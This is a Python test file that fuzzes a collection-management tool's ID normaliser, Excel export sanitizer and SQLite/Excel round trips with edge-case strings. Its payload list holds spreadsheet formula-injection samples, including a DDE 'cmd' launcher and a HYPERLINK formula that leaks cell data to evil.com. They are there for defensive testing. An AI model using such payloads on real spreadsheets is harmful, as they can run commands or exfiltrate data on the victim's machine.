import os
import sys
import pandas as pd
import tempfile
import sqlite3

# Ensure project root is in sys.path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from repository import (
    _normalize_object_id_series,
    _deduplicate_columns,
    _detect_and_promote_header,
    _clean_trailing_and_blank_columns,
    _normalise_dataframes,
    ExcelRepository,
    SQLiteRepository
)
from utils import sanitize_df_for_excel

def test_input_fuzzing():
    print("=" * 60)
    print("RUNNING EXHAUSTIVE INPUT FUZZING & INJECTION RESILIENCE TEST")
    print("=" * 60)

    fuzz_payloads = [
        "Normal_ID_001",
        "NullByte\x00InMiddle",
        "LeadingNull\x00",
        "\x00TrailingNull",
        "Emoji_🌱_🌿_🌳_🌺_🔬_📊",
        "RTL_مرحبا_العالم_עברית",
        "VeryLongString_" + ("A" * 100_000),
        "=cmd|' /C calc'!A0",
        "-2+3*[1]!$A$1",
        "+@SUM(1,1)",
        "@HYPERLINK(\"http://evil.com?leak=\"&A1,\"Click\")",
        "\tTabPrefixed",
        "\rCarriageReturnPrefixed",
        "#REF!",
        "#VALUE!",
        "#N/A",
        "#DIV/0!",
        "#NULL!",
        "1E+05",
        "1.0E+05",
        "1e5",
        "1.5e3",
        "00123",
        "-42.0",
        "100.0",
        "Float.With.Dots.1.0.0",
        "   WhitespacePadded   "
    ]

    print(f"1. Fuzzing ObjectID normalization across {len(fuzz_payloads)} edge-case payloads...")
    s = pd.Series(fuzz_payloads)
    norm_s = _normalize_object_id_series(s)
    assert len(norm_s) == len(fuzz_payloads)
    # Check that scientific notation expanded cleanly
    assert norm_s.iloc[18] == "100000"  # "1E+05"
    assert norm_s.iloc[19] == "100000"  # "1.0E+05"
    assert norm_s.iloc[20] == "100000"  # "1e5"
    assert norm_s.iloc[21] == "1500"    # "1.5e3"
    assert norm_s.iloc[22] == "00123"   # Preserved leading zero
    assert norm_s.iloc[23] == "-42"     # -42.0 integer float stripped
    assert norm_s.iloc[24] == "100"     # 100.0 integer float stripped
    # Formula error tokens cleaned
    assert norm_s.iloc[13] == ""        # #REF!
    assert norm_s.iloc[14] == ""        # #VALUE!
    print("   [PASS] ObjectID normalization safely handled all payloads.")

    print("2. Fuzzing Excel export sanitizer (formula injection & illegal XML chars)...")
    df_fuzz = pd.DataFrame({
        "TextCol": fuzz_payloads,
        "NumericCol": list(range(len(fuzz_payloads))),
        "Comment": ["Test"] * len(fuzz_payloads)
    })
    sanitized = sanitize_df_for_excel(df_fuzz)
    assert sanitized is not None
    # Verify formula injection strings were prepended with single quote
    for val in sanitized["TextCol"]:
        if isinstance(val, str) and (val.startswith("=") or val.startswith("@") or val.startswith("+")):
            assert val.startswith("'"), f"Formula not sanitized: {val}"
    print("   [PASS] Formula injection sanitation verified.")

    print("3. Fuzzing Excel & SQLite Roundtrip with 100k character string and emojis...")
    with tempfile.TemporaryDirectory() as tmpdir:
        sqlite_path = os.path.join(tmpdir, "fuzz_test.db")
        excel_path = os.path.join(tmpdir, "fuzz_test.xlsx")

        config = {
            "sheets": {"reg": "Registration", "obs": "Observation", "photo": "Photo", "log": "Log"},
            "ui_sections": {
                "registration": [{"name": "Genus"}, {"name": "Species"}, {"name": "Notes"}],
                "location": [{"name": "Cabinet"}],
                "problems": [{"name": "MissingLabel"}]
            }
        }

        # Safe OIDs for index
        oids = [f"FUZZ-{i:03d}" for i in range(len(fuzz_payloads))]
        df_reg = pd.DataFrame({
            "Genus": ["Quercus"] * len(fuzz_payloads),
            "Species": ["robur"] * len(fuzz_payloads),
            "Notes": fuzz_payloads
        }, index=pd.Index(oids, name="ObjectID"))

        df_obs = pd.DataFrame({
            "Reviewed": [False] * len(fuzz_payloads),
            "Cabinet": ["Cab-1"] * len(fuzz_payloads),
            "MissingLabel": [False] * len(fuzz_payloads)
        }, index=pd.Index(oids, name="ObjectID"))

        # Test SQLite save and load
        SQLiteRepository.save_sqlite(sqlite_path, df_reg, df_obs, pd.DataFrame(columns=["ObjectID"]), pd.DataFrame())
        reg_read, obs_read, _, _ = SQLiteRepository.load_sqlite(sqlite_path, config)
        assert len(reg_read) == len(fuzz_payloads)
        match_note = reg_read.loc[reg_read["ObjectID"] == "FUZZ-004", "Notes"].iloc[0]
        assert match_note == "Emoji_🌱_🌿_🌳_🌺_🔬_📊"
        print("   [PASS] SQLite persistence roundtrip succeeded with emojis & large payloads.")

        # Test Excel export and load
        SQLiteRepository.export_to_excel(
            sqlite_path=sqlite_path,
            excel_path=excel_path,
            config=config,
            df_reg=df_reg,
            df_obs=df_obs
        )
        assert os.path.exists(excel_path)
        reg_xl, obs_xl, _, _ = ExcelRepository.load_excel(excel_path, config)
        assert len(reg_xl) == len(fuzz_payloads)
        print("   [PASS] Excel export & load roundtrip succeeded with all fuzzed inputs.")

    print("=" * 60)
    print("ALL INPUT FUZZING & INJECTION TESTS PASSED (100% RESILIENT)!")
    print("=" * 60)

if __name__ == "__main__":
    test_input_fuzzing()
